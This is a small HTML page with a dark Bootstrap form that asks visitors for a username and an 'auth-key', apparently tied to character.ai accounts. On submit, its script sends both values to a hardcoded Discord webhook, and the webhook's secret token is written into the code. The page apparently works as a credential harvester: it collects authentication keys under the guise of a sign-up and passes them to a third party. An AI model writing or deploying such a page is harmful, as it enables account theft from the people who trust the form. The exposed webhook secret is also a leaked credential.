<html>
  <head>

    
    <!-- Bootstrap CSS -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
  </head>
  <body style="background-color: black;" class="container mt-5">
    <form onsubmit="sendContact(event)">
      <div class="mb-3">
        <label style="color: white;" for="emailInput" class="form-label">Enter your username (not in character.ai)</label>
        <input class="form-control" id="emailInput">
      </div>
      <div class="mb-3">
        <label style="color: white;" for="messageInput" class="form-label">Enter auth-key.</label>
        <textarea class="form-control" id="messageInput" rows="3"></textarea>
      </div>
      

    </div>
      <button type="submit" class="btn btn-primary">Submit</button>
      
      
    </form>
      <script>

    
      async function sendContact(ev) {
        ev.preventDefault();

        const senderEmail = document
          .getElementById('emailInput').value;
        const senderMessage = document
          .getElementById('messageInput').value;

        const webhookBody = {
          embeds: [{
            title: 'New user!',
            fields: [
              { name: 'Sender', value: senderEmail },
              { name: 'Message', value: senderMessage }
            ]
          }],
        };

        const webhookUrl = 'https://discord.com/api/webhooks/1168939175135957012/7KBqVW154aais-_bETRwECb2AoFo-80--SKmMDdObgDC5C4WEGyO5lf6C3R70FCKlNYd';

        const response = await fetch(webhookUrl, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify(webhookBody),
        });

        if (response.ok) {
          alert('Successful');
        } else {
          alert('There was an error! Try again later!');
        }
      }
    </script>
  </body>
</html>
